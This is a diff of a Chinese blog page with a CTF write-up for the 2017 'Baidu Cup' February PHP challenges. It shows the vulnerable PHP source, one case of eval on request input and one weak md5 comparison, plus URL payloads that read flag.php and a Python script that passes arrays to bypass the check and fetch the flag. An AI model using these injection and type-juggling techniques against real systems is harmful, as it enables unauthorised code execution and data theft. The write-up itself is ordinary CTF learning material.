+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://138c4d7d85c04385b91b779047d5906d0a331ddc3728405a.changame.ichunqiu.com/?hello=GLOBALS<br>&#x5F97;&#x5230;<br>[&quot;d3f0f8&quot;]=&gt; string(42) &quot;flag{bfed2cef-1a03-4337-9f55-b00ddbcc5f0a}<br></code></pre></td></tr></tbody></table></figure>
 
 
-<h4 id="“百度杯”CTF比赛-2017-二月场爆破-2"><a href="#“百度杯”CTF比赛-2017-二月场爆破-2" class="headerlink" title="“百度杯”CTF比赛 2017 二月场爆破-2"></a>“百度杯”CTF比赛 2017 二月场爆破-2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-2"><a href="#&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-2" class="headerlink" title="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-2"></a>&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-2</h4><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;hello&apos;</span>];<br><span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></tbody></table></figure>
 
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4139dc5d40184be4bb481b0d09226223d3815a7b2aea4456.changame.ichunqiu.com&#x2F;?hello&#x3D;file_get_contents(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://4139dc5d40184be4bb481b0d09226223d3815a7b2aea4456.changame.ichunqiu.com/?hello=file_get_contents(&apos;flag.php&apos;)<br></code></pre></td></tr></tbody></table></figure>
 
-<h4 id="“百度杯”CTF比赛-2017-二月场爆破-3"><a href="#“百度杯”CTF比赛-2017-二月场爆破-3" class="headerlink" title="“百度杯”CTF比赛 2017 二月场爆破-3"></a>“百度杯”CTF比赛 2017 二月场爆破-3</h4><p>题目描述:<code>这个真的是爆破</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].<span class="variable">$str_rand</span>[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>]==(<span class="variable">$value</span>[<span class="number">0</span>].<span class="variable">$value</span>[<span class="number">1</span>]) &amp;&amp; substr(md5(<span class="variable">$value</span>),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-3"><a href="#&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-3" class="headerlink" title="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-3"></a>&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;&#x7206;&#x7834;-3</h4><p>&#x9898;&#x76EE;&#x63CF;&#x8FF0;:<code>&#x8FD9;&#x4E2A;&#x771F;&#x7684;&#x662F;&#x7206;&#x7834;</code></p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">require</span>(<span class="hljs-string">&apos;./flag.php&apos;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;nums&apos;</span>])){<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;nums&apos;</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;time&apos;</span>] = time();<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;whoami&apos;</span>] = <span class="hljs-string">&apos;ea&apos;</span>;<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;time&apos;</span>]+<span class="hljs-number">120</span>&lt;time()){<br>  session_destroy();<br>}<br><br><span class="hljs-variable">$value</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&apos;value&apos;</span>];<br><span class="hljs-variable">$str_rand</span> = range(<span class="hljs-string">&apos;a&apos;</span>, <span class="hljs-string">&apos;z&apos;</span>);<br><span class="hljs-variable">$str_rands</span> = <span class="hljs-variable">$str_rand</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)].<span class="hljs-variable">$str_rand</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;whoami&apos;</span>]==(<span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$value</span>[<span class="hljs-number">1</span>]) &amp;&amp; substr(md5(<span class="hljs-variable">$value</span>),<span class="hljs-number">5</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>){<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;nums&apos;</span>]++;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;whoami&apos;</span>] = <span class="hljs-variable">$str_rands</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str_rands</span>;<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;nums&apos;</span>]&gt;=<span class="hljs-number">10</span>){<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
 
-<p>这样的题目本地调试最好了<br>其实就是传value要等于<code>$_SESSION[&#39;whoami&#39;]</code>，而后者每次会变，但是会显示出来<br>很沙雕的一点是<code>substr(md5($value),5,4)==0</code>,通过前面<code>$value[0].$value[1]</code>我们知道value是字符串数组，数组的md5是null，和0是弱相等的~所以第一次传<code>?value[0]=e&amp;value[1]=a</code>,会返回两个字符 假设是bq 那就 <code>?value[0]=b&amp;value[1]=q</code>,十次就行，脚本写起来也简单<br>payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://9c132b640d22437c940c92547bb4a80f30f6958b40284a36.changame.ichunqiu.com/&#x27;</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">&#x27;?value[]=ea&#x27;</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">&#x27;?value[]=&#x27;</span>+html[<span class="number">0</span>:<span class="number">2</span>],timeout=<span class="number">2</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;.*&#125;&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(html[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span> (html[:<span class="number">50</span>])</span><br></pre></td></tr></table></figure>
+<p>&#x8FD9;&#x6837;&#x7684;&#x9898;&#x76EE;&#x672C;&#x5730;&#x8C03;&#x8BD5;&#x6700;&#x597D;&#x4E86;<br>&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4F20;value&#x8981;&#x7B49;&#x4E8E;<code>$_SESSION[&apos;whoami&apos;]</code>&#xFF0C;&#x800C;&#x540E;&#x8005;&#x6BCF;&#x6B21;&#x4F1A;&#x53D8;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x663E;&#x793A;&#x51FA;&#x6765;<br>&#x5F88;&#x6C99;&#x96D5;&#x7684;&#x4E00;&#x70B9;&#x662F;<code>substr(md5($value),5,4)==0</code>,&#x901A;&#x8FC7;&#x524D;&#x9762;<code>$value[0].$value[1]</code>&#x6211;&#x4EEC;&#x77E5;&#x9053;value&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x6570;&#x7EC4;&#xFF0C;&#x6570;&#x7EC4;&#x7684;md5&#x662F;null&#xFF0C;&#x548C;0&#x662F;&#x5F31;&#x76F8;&#x7B49;&#x7684;~&#x6240;&#x4EE5;&#x7B2C;&#x4E00;&#x6B21;&#x4F20;<code>?value[0]=e&amp;value[1]=a</code>,&#x4F1A;&#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x5B57;&#x7B26; &#x5047;&#x8BBE;&#x662F;bq &#x90A3;&#x5C31; <code>?value[0]=b&amp;value[1]=q</code>,&#x5341;&#x6B21;&#x5C31;&#x884C;&#xFF0C;&#x811A;&#x672C;&#x5199;&#x8D77;&#x6765;&#x4E5F;&#x7B80;&#x5355;<br>payload</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&apos;http://9c132b640d22437c940c92547bb4a80f30f6958b40284a36.changame.ichunqiu.com/&apos;</span><br>session=requests.Session()<br>html=session.get(url+<span class="hljs-string">&apos;?value[]=ea&apos;</span>).text<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    html=session.get(url+<span class="hljs-string">&apos;?value[]=&apos;</span>+html[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],timeout=<span class="hljs-number">2</span>).text<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;flag{.*}&apos;</span> <span class="hljs-keyword">in</span> html:<br>        <span class="hljs-keyword">break</span><br>    print(html[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>])<br><span class="hljs-built_in">print</span> (html[:<span class="hljs-number">50</span>])<br></code></pre></td></tr></tbody></table></figure>
 
 
 <p><img src="31.png" alt="img"></p>
-
+</body></html>
     
     </div>
     
     <div class="columns is-variable is-1 is-multiline is-mobile">
     
-        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/PHP/">#PHP</a></span>
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="../../../../tags/PHP/">#PHP</a></span>
     
     </div>
     
@@ -332,12 +332,12 @@
     <div class="columns is-mobile is-multiline article-nav">
         <span class="column is-12-mobile is-half-desktop  article-nav-prev">
             
-            <a href="/2019/04/27/Sqli-Labs/">Sqli-Labs</a>
+            <a href="../../27/Sqli-Labs/">Sqli-Labs</a>
             
         </span>
         <span class="column is-12-mobile is-half-desktop  article-nav-next">
             
-            <a href="/2019/04/09/2019%E5%B9%B4%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E4%B9%8B%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%92%8CAutoKey%E7%9A%84%E5%8C%BA%E5%88%AB/">2019年西湖论剑之维吉尼亚和AutoKey的区别</a>
+            <a href="../../09/2019%E5%B9%B4%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E4%B9%8B%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%92%8CAutoKey%E7%9A%84%E5%8C%BA%E5%88%AB/">2019年西湖论剑之维吉尼亚和AutoKey的区别</a>
             
         </span>
     </div>
@@ -520,7 +520,7 @@
 
 
 
-<script src="/js/script.js"></script>
+<script src="../../../../js/script.js"></script>
 
 
     
@@ -546,13 +546,13 @@
                 TAGS: 'Tags',
                 UNTITLED: '(Untitled)',
             },
-            CONTENT_URL: '/content.json',
+            CONTENT_URL: '../../../../content.json',
         };
         window.INSIGHT_CONFIG = INSIGHT_CONFIG;
     })(window);
 </script>
 
-<script src="/js/insight.js"></script>
+<script src="../../../../js/insight.js"></script>
 
     
 </body>
